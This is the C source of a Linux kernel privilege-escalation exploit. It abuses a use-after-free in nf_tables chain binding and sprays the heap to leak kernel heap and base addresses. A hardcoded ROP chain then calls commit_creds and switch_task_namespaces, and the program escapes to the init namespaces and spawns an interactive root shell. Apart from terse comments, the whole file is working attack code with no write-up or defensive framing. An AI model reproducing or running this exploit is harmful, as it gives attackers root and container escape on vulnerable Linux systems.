#define _GNU_SOURCE
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/set.h>
#include <libnftnl/table.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>

#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <linux/limits.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <assert.h>
#include <inttypes.h>
#include <pthread.h>

#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <arpa/inet.h>

#include <keyutils.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define SPRAY_BATCH_SIZE 64
#define SPRAY_BATCHES 16

#define NFT_NOTRACK_OPS 0x1ac8cc0
#define INIT_NSPROXY 0x2461f40
#define COMMIT_CREDS 0x110980
#define FIND_TASK_BY_VPID 0x1077c0
#define SWITCH_TASK_NAMESPACES 0x10efa0
#define KPTI_TRAMPOLINE 0x1201090 + 54 // swapgs_restore_regs_and_return_to_usermode + offset
#define INIT_CRED 0x2462180

#define PUSH_RSI_JMP_QWORD_PTR_RSI_F 0xc6b728 // push rsi ; jmp qword ptr [rsi + 0xf]
#define POP_RSP_R13_R14_R15_RET 0x12e52d // jmp 0xffffffff811878c0 (smp_call_function_single_async) -> ret
#define POP_RDI_RET 0x082610 // pop rdi ; ret
#define POP_RSI_RET 0x57f44e // pop rsi ; ret
#define POP_RDX_RET 0x04e9ee // pop rdx ; ret
#define MOV_RDI_RAX_RET 0x5df50a // mov rdi, rax ; mov dword ptr [rdx], ecx ; mov rax, rdi ; jmp 0xffffffff82404200 (__x86_return_thunk) -> ret

struct list_head {
    struct list_head *next, *prev;
};

struct rhash_head {
    struct rhash_head* next;
};

struct rhlist_head {
    struct rhash_head rhead;
    struct rhlist_head* next;
};

struct msg_msgseg {
    struct msg_msgseg* next;
};

struct nft_expr {
    struct nft_expr_ops* ops;
    unsigned char data[]
        __attribute__((aligned(__alignof__(uint64_t))));
};

struct nft_rule {
    struct list_head list;
    uint64_t handle : 42,
        genmask : 2,
        dlen : 12,
        udata : 1;
    unsigned char data[]
        __attribute__((aligned(__alignof__(struct nft_expr))));
};

struct nft_rule_dp {
    uint64_t is_last : 1,
        dlen : 12,
        handle : 42; /* for tracing */
    unsigned char data[]
        __attribute__((aligned(__alignof__(struct nft_expr))));
};

struct nft_rule_blob {
    unsigned long size;
    unsigned char data[]
        __attribute__((aligned(__alignof__(struct nft_rule_dp))));
};

struct nft_chain {
    struct nft_rule_blob* blob_gen_0;
    struct nft_rule_blob* blob_gen_1;
    struct list_head rules;
    struct list_head list;
    struct rhlist_head rhlhead;
    struct nft_table* table;
    uint64_t handle;
    uint32_t use;
    uint8_t flags : 5,
        bound : 1,
        genmask : 2;
    char* name;
    uint16_t udlen;
    uint8_t* udata;

    /* Only used during control plane commit phase: */
    struct nft_rule_blob* blob_next;
};

struct nft_userdata {
    uint8_t len;
    unsigned char data[];
};

typedef struct mnl_socket* sock;
typedef struct mnl_nlmsg_batch* batch;
typedef struct nlmsghdr* nlmsghdr;
typedef struct nftnl_table* table;
typedef struct nftnl_chain* chain;
typedef struct nftnl_rule* rule;
typedef struct nftnl_expr* expr;

static sock nlsock;
static const uint16_t family = NFPROTO_IPV4;
static uint32_t seq = 1, rseq = 1, table_counter;
static uint64_t heap, vmlinux, rule_handle;
static uint64_t user_cs, user_ss, user_rflags, user_sp;
static char current_table_name[16], free_chain_name[160]; // to make the freed chain name fall in kmalloc-192

char* regular_chain_name_2 = "test_regular_chain_2";
char* regular_chain_name_3 = "test_regular_chain_3";
char* bind_chain_name_1 = "test_bind_chain_1";

static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;");
}

void monke()
{
    INFO("Return to monke");

    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);

    char* args[] = { "/bin/bash", "-i", NULL };
    execve(args[0], args, NULL);
}

void write_to_file(const char* which, const char* format, ...)
{
    FILE* fu = fopen(which, "w");
    va_list args;
    va_start(args, format);
    if (vfprintf(fu, format, args) < 0) {
        ERROR("cannot write");
        exit(1);
    }
    fclose(fu);
}

int setup(void)
{
    uid_t uid = getuid();
    gid_t gid = getgid();

    // In order to use nf_tables, we need CAP_NET_ADMIN
    INFO("Setting up user namespace");

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET)) {
        ERROR("unshare(CLONE_NEWUSER | CLONE_NEWNET)");
        return -1;
    }

    // Pin process to a single CPU to avoid nf_tables allocations to spill over different slabs
    INFO("Pinning process to CPU #0");

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
        perror("[-] sched_setaffinity");
        return -1;
    }

    // now we map uid and gid
    write_to_file("/proc/self/uid_map", "0 %d 1", uid);
    // deny setgroups (see user_namespaces(7))
    write_to_file("/proc/self/setgroups", "deny");
    // remap gid
    write_to_file("/proc/self/gid_map", "0 %d 1", gid);

    INFO("Creating netfilter netlink socket");
    if ((nlsock = mnl_socket_open(NETLINK_NETFILTER)) == NULL) {
        ERROR("mnl_socket_open(NETLINK_NETFILTER)");
        return -1;
    }

    return 0;
}

static table make_table(const char* name, const void* udata, uint32_t udlen)
{
    table t = nftnl_table_alloc();
    if (t == NULL) {
        ERROR("Couldn't allocate a table");
        exit(EXIT_FAILURE);
    }

    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(t, NFTNL_TABLE_NAME, name);

    if (udata != NULL && udlen > 0)
        nftnl_table_set_data(t, NFTNL_TABLE_USERDATA, udata, udlen);

    return t;
}

// static chain make_chain(const char* table, const char* name, uint32_t flags, int hooknum, int prio)
static chain make_chain(const char* table, const char* name, uint32_t flags)
{
    chain c = nftnl_chain_alloc();
    if (c == NULL) {
        ERROR("Couldn't allocate a chain");
        exit(EXIT_FAILURE);
    }

    nftnl_chain_set_str(c, NFTNL_CHAIN_TABLE, table);
    nftnl_chain_set_str(c, NFTNL_CHAIN_NAME, name);
    nftnl_chain_set_u32(c, NFTNL_CHAIN_FLAGS, flags);

    // // make base chain
    // if (hooknum != 0) {
    //     nftnl_chain_set_u32(c, NFTNL_CHAIN_HOOKNUM, hooknum);
    //     nftnl_chain_set_u32(c, NFTNL_CHAIN_PRIO, prio);
    // }

    return c;
}

static rule make_rule(const char* table, const char* chain, expr* exprs, size_t num_exprs, const void* udata, uint32_t udlen, uint64_t handle)
{
    rule r = nftnl_rule_alloc();
    if (r == NULL) {
        ERROR("Couldn't allocate a rule");
        return NULL;
    }

    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);

    for (int i = 0; i < num_exprs; ++i)
        nftnl_rule_add_expr(r, exprs[i]);

    if (udlen > 0)
        nftnl_rule_set_data(r, NFTNL_RULE_USERDATA, udata, udlen);

    if (handle > 0)
        nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE, handle);

    return r;
}

static expr make_immediate_jump_expr(const char* target_chain)
{
    expr e = nftnl_expr_alloc("immediate");
    if (e == NULL)
        return NULL;

    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, NFT_JUMP);
    nftnl_expr_set_str(e, NFTNL_EXPR_IMM_CHAIN, target_chain);

    return e;
}

static expr make_notrack_expr()
{
    return nftnl_expr_alloc("notrack");
}

static batch batch_init(size_t size)
{
    void* buf = malloc(size);
    batch b = mnl_nlmsg_batch_start(buf, size);
    nftnl_batch_begin(mnl_nlmsg_batch_current(b), seq++);
    mnl_nlmsg_batch_next(b);
    rseq = seq;
    return b;
}

static void batch_end(batch b)
{
    nftnl_batch_end(mnl_nlmsg_batch_current(b), seq);
    mnl_nlmsg_batch_next(b);
}

static ssize_t batch_send(batch b, sock s)
{
    return mnl_socket_sendto(s, mnl_nlmsg_batch_head(b), mnl_nlmsg_batch_size(b));
}

static void batch_free(batch b)
{
    void* buf = mnl_nlmsg_batch_head(b);
    mnl_nlmsg_batch_stop(b);
    free(buf);
}

static void batch_new_table(batch b, table t)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_NEWTABLE, family, NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND, seq++);
    nftnl_table_nlmsg_build_payload(hdr, t);
    mnl_nlmsg_batch_next(b);
}

static void batch_new_chain(batch b, chain c)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_NEWCHAIN, family, NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND, seq++);
    nftnl_chain_nlmsg_build_payload(hdr, c);
    mnl_nlmsg_batch_next(b);
}

static void batch_del_chain(batch b, chain c)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_DELCHAIN, family, NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(hdr, c);
    mnl_nlmsg_batch_next(b);
}

static void batch_new_rule(batch b, rule r)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_NEWRULE, family, NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND, seq++);
    nftnl_rule_nlmsg_build_payload(hdr, r);
    mnl_nlmsg_batch_next(b);
}

static void batch_del_rule(batch b, rule r)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_DELRULE, family, NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(hdr, r);
    mnl_nlmsg_batch_next(b);
}

static nlmsghdr dump_rule(rule r, char* buf)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, family, NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(hdr, r);
    return hdr;
}

static int run_callbacks(sock s, mnl_cb_t cb, void* data)
{
    // INFO("Start callback: rseq = %d, seq = %d", rseq, seq);
    char buf[MNL_SOCKET_BUFFER_SIZE];
    int ret = 0;
    while (rseq < seq) {
        ret = mnl_socket_recvfrom(s, buf, sizeof(buf));
        if (ret <= 0)
            break;
        ret = mnl_cb_run(buf, ret, rseq, mnl_socket_get_portid(s), cb, data);
        if (ret < 0)
            break;
        rseq += ret == 0;
    }
    // INFO("End callback: rseq = %d, seq = %d", rseq, seq);
    return ret;
}

static int trigger_uaf()
{
    INFO("Triggering UAF");
    sprintf(current_table_name, "%d", table_counter++);
    table t = make_table(current_table_name, NULL, 0);
    chain c_spray = make_chain(current_table_name, "spray", 0);

    chain c_free = make_chain(current_table_name, free_chain_name, 0);
    
    chain c_primitive = make_chain(current_table_name, "primitive", 0);
    expr e_primitive = make_immediate_jump_expr(free_chain_name);
    rule r_primitive = make_rule(current_table_name, "primitive", &e_primitive, 1, NULL, 0, 0);

    chain bc1 = make_chain(current_table_name, bind_chain_name_1, NFT_CHAIN_BINDING);
    expr e_bc1 = make_immediate_jump_expr(free_chain_name);
    rule r_bc1 = make_rule(current_table_name, bind_chain_name_1, &e_bc1, 1, NULL, 0, 0);
    rule del_r_bc1 = make_rule(current_table_name, bind_chain_name_1, NULL, 0, NULL, 0, 0);

    chain c3 = make_chain(current_table_name, regular_chain_name_3, 0);
    expr e3 = make_immediate_jump_expr(bind_chain_name_1);
    rule r3 = make_rule(current_table_name, regular_chain_name_3, &e3, 1, NULL, 0, 0);
    rule del_r3 = make_rule(current_table_name, regular_chain_name_3, NULL, 0, NULL, 0, 0);

    chain del_c_free = make_chain(current_table_name, free_chain_name, 0);

    batch b = batch_init(MNL_SOCKET_BUFFER_SIZE * 2);
    batch_new_table(b, t);

    batch_new_chain(b, c_free);

    batch_new_chain(b, c_primitive);
    batch_new_rule(b, r_primitive);

    batch_new_chain(b, bc1);
    batch_new_rule(b, r_bc1);
    batch_del_rule(b, del_r_bc1);

    batch_new_chain(b, c3);
    batch_new_rule(b, r3);
    batch_del_rule(b, del_r3);

    batch_new_chain(b, c_spray); // new chain before free c_free

    batch_del_chain(b, del_c_free);


    batch_end(b);
    if (batch_send(b, nlsock) == -1) {
        ERROR("batch_send");
        return -1;
    }
    batch_free(b);
    if (run_callbacks(nlsock, NULL, NULL) < 0) {
        ERROR("run_callbacks");
        return -1;
    }

    INFO("Sleeping to wait for the work queue to actually free the chain");
    sleep(1);

    return 0;
}

static int dump_expr_leak_heap(expr e, void* dat)
{
    const char* data;

    data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    if (strlen(data) < 17) // list + handle
        return MNL_CB_OK;

    struct nft_rule* r = (struct nft_rule*)data;
    heap = (uint64_t)r->list.next;
    rule_handle = (r->handle & 0xffff) + 1; // we got the address of the next rule, handle should be +1
    if ((heap & 0xff) == 0x90 || (heap & 0xff) == 0x10) { // we got leak to spray chain (rules list at offset 0x10 of nft_chain)
        heap = (uint64_t)r->list.prev; // get address of a rule instead
        rule_handle = (r->handle & 0xffff) - 1; // we got the address of the previous rule, handle should be -1
    }
    INFO("heap = 0x%lx, rule_handle = %lu", heap, rule_handle);

    return MNL_CB_OK;
}

static int dump_expr_leak_vmlinux(expr e, void* dat)
{
    const char* data;

    data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    if (strlen(data) < 8)
        return MNL_CB_OK;

    vmlinux = *(uint64_t*)data;
    if (vmlinux >= 0xffffffff00000000) {
        vmlinux -= NFT_NOTRACK_OPS;
    }
    INFO("vmlinux = 0x%lx", vmlinux);

    return MNL_CB_OK;
}

static int dump_exprs(const struct nlmsghdr* nlh, void* data)
{
    rule r;

    r = nftnl_rule_alloc();
    nftnl_rule_nlmsg_parse(nlh, r);

    nftnl_expr_foreach(r, data, NULL);

    nftnl_rule_free(r);

    return MNL_CB_OK;
}

static int leak_heap() {
    INFO("Trying to leak kernel heap");

    char data[191 - sizeof(struct nft_expr) - sizeof(struct nft_rule)] = { 0 }; // to make the rule fall in kmalloc-192
    expr e = make_notrack_expr(); // for leaking vmlinux later
    rule r = make_rule(current_table_name, "spray", &e, 1, data, sizeof(data), 0);

    for (int z = 0; z < SPRAY_BATCHES; ++z) {
        batch b = batch_init(1048576); // 1M buffer should be enough
        for (int i = 0; i < SPRAY_BATCH_SIZE; ++i) {
            batch_new_rule(b, r);
        }
        batch_end(b);
        if (batch_send(b, nlsock) == -1) {
            ERROR("batch_send");
            return -1;
        }
        batch_free(b);
        if (run_callbacks(nlsock, NULL, NULL) < 0) {
            ERROR("run_callbacks leak_heap: spray");
            return -1;
        }
    }

    char buf[MNL_SOCKET_BUFFER_SIZE];

    rule r_primitive = make_rule(current_table_name, "primitive", NULL, 0, NULL, 0, 3); // the primitive rule has handle = 3
    rseq = seq;
    nlmsghdr hdr = dump_rule(r_primitive, buf);
    if (mnl_socket_sendto(nlsock, buf, hdr->nlmsg_len) < 0) {
        ERROR("mnl_socket_sendto");
        return -1;
    }
    if (run_callbacks(nlsock, dump_exprs, dump_expr_leak_heap) < 0) {
        ERROR("run_callbacks leak_heap: primitive");
        return -1;
    }

    return 0;
}

static int leak_vmlinux()
{
    INFO("Trying to leak kernel base");
    static int table_spray_counter = 0;

    char data[128] = { 0 };
    struct nft_chain* fake_chain = (struct nft_chain*)data;
    // set rule list and chain flag for later stage
    // because we trigger RIP control by deleting the primitive rule,
    // the immediate expression deactivation will only call deactivate()
    // on the rules under this chain if chain flags has NFT_CHAIN_BINDING.
    fake_chain->rules.next = fake_chain->rules.prev = (struct list_head*)heap;
    fake_chain->flags = NFT_CHAIN_BINDING;
    // exprs are flattened after rule metadata, then comes userdata
    // we prepared a notrack expr before, now let's leak its ops
    fake_chain->name = (char*)(heap + sizeof(struct nft_rule));

    for (int z = 0; z < SPRAY_BATCHES; ++z) {
        batch b = batch_init(1048576); // 1M buffer should be enough
        for (int i = 0; i < SPRAY_BATCH_SIZE; ++i) {
            char table_name[32];
            sprintf(table_name, "tskb%d", table_spray_counter++);
            table t = make_table(table_name, data, sizeof(data));
            batch_new_table(b, t);
            nftnl_table_free(t);
        }
        batch_end(b);
        if (batch_send(b, nlsock) == -1) {
            ERROR("batch_send");
            return -1;
        }
        batch_free(b);
        if (run_callbacks(nlsock, NULL, NULL) < 0) {
            ERROR("run_callbacks");
            return -1;
        }
    }

    char buf[MNL_SOCKET_BUFFER_SIZE];
    rule r_primitive = make_rule(current_table_name, "primitive", NULL, 0, NULL, 0, 3); // the primitive rule has handle = 3
    rseq = seq;
    nlmsghdr hdr = dump_rule(r_primitive, buf);
    if (mnl_socket_sendto(nlsock, buf, hdr->nlmsg_len) < 0) {
        ERROR("mnl_socket_sendto");
        return -1;
    }
    if (run_callbacks(nlsock, dump_exprs, dump_expr_leak_vmlinux) < 0) {
        ERROR("run_callbacks");
        return -1;
    }

    return 0;
}

static int spray_krop()
{
    INFO("Spraying KROP");
    static int table_spray_counter = 0;

    rule r_to_delete = make_rule(current_table_name, "spray", NULL, 0, NULL, 0, rule_handle);

    batch b = batch_init(MNL_SOCKET_BUFFER_SIZE * 2);
    batch_del_rule(b, r_to_delete);
    batch_end(b);
    if (batch_send(b, nlsock) == -1) {
        ERROR("batch_send");
        return -1;
    }
    batch_free(b);
    if (run_callbacks(nlsock, NULL, NULL) < 0) {
        ERROR("run_callbacks");
        return -1;
    }

    INFO("Sleeping to wait for the work queue to actually free the rule");
    sleep(1);

    save_state();

    char data[192] = { 0 };
    struct nft_rule* fake_rule = (struct nft_rule*)data;
    fake_rule->dlen = 1; // pass the check
    struct nft_expr* fake_expr = (struct nft_expr*)(data + sizeof(struct nft_rule));
    fake_expr->ops = (struct nft_expr_ops*)(heap + 0x88 - 0x28); // offset 0x88 of fake rule <=> expr->ops->deactivate (offset 0x28 of expr->ops)
    // the jop gadget jumps to [rsi + 0xf] so we put the stack pivot gadget there
    *(uint64_t*)((char*)fake_expr + 0xf) = vmlinux + POP_RSP_R13_R14_R15_RET;

    uint64_t* rop = (uint64_t*)(data + sizeof(struct nft_rule) + sizeof(struct nft_expr));

    // pass through the stack pivot gadget
    rop++;
    rop++;

    // commit_creds(&init_cred)
    *rop++ = vmlinux + POP_RDI_RET;
    *rop++ = vmlinux + INIT_CRED;
    *rop++ = vmlinux + COMMIT_CREDS;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    *rop++ = vmlinux + POP_RDI_RET;
    *rop++ = 1;
    *rop++ = vmlinux + FIND_TASK_BY_VPID;
    *rop++ = vmlinux + MOV_RDI_RAX_RET;
    *rop++ = vmlinux + POP_RSI_RET;
    *rop++ = vmlinux + INIT_NSPROXY;
    *rop++ = vmlinux + SWITCH_TASK_NAMESPACES;

    // return to userspace
    *rop++ = vmlinux + KPTI_TRAMPOLINE;
    *rop++ = vmlinux + PUSH_RSI_JMP_QWORD_PTR_RSI_F; // jop gadget, put here because this space is unused
    rop++;
    *rop++ = (uint64_t)monke;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_sp;
    *rop++ = user_ss;

    for (int z = 0; z < SPRAY_BATCHES; ++z) {
        batch b = batch_init(1048576); // 1M buffer should be enough

        for (int i = 0; i < SPRAY_BATCH_SIZE; ++i) {
            char table_name[32];
            sprintf(table_name, "tsrp%d", table_spray_counter++);
            table t = make_table(table_name, data, sizeof(data));
            batch_new_table(b, t);
            nftnl_table_free(t);
        }

        batch_end(b);
        if (batch_send(b, nlsock) == -1) {
            ERROR("batch_send");
            return -1;
        }
        batch_free(b);
        if (run_callbacks(nlsock, NULL, NULL) < 0) {
            ERROR("run_callbacks");
            return -1;
        }
    }

    return 0;
}

static void escalate()
{
    INFO("Escalating privileges");

    // deleting the primitive rule will call deactivate on the bound chain
    // because we set the flag of the reclaimed fake chain to `NFT_CHAIN_BINDING`,
    // all expressions under all rules of that chain will have its deactivate() routine.
    rule r = make_rule(current_table_name, "primitive", NULL, 0, NULL, 0, 3); // the primitive rule has handle = 3
    batch b = batch_init(MNL_SOCKET_BUFFER_SIZE * 2);
    batch_del_rule(b, r);
    batch_end(b);
    if (batch_send(b, nlsock) == -1) {
        ERROR("batch_send");
        return;
    }
    batch_free(b);
}

int main()
{
    if (setup() == -1)
        return -1;
    // system("ip link set dev lo up"); // setting the loopback up

    memset(free_chain_name, 'A', sizeof(free_chain_name) - 1);
    free_chain_name[sizeof(free_chain_name) - 1] = '\0';

    while (heap < 0xffff000000000000) {
        if (trigger_uaf() == -1)
            return -1;

        if (leak_heap() == -1)
            return -1;
    }

    while (vmlinux < 0xffffffff00000000) {
        if (leak_vmlinux() == -1)
            return -1;
    }

    if (spray_krop() == -1)
        return -1;

    escalate();

    return 0;
}
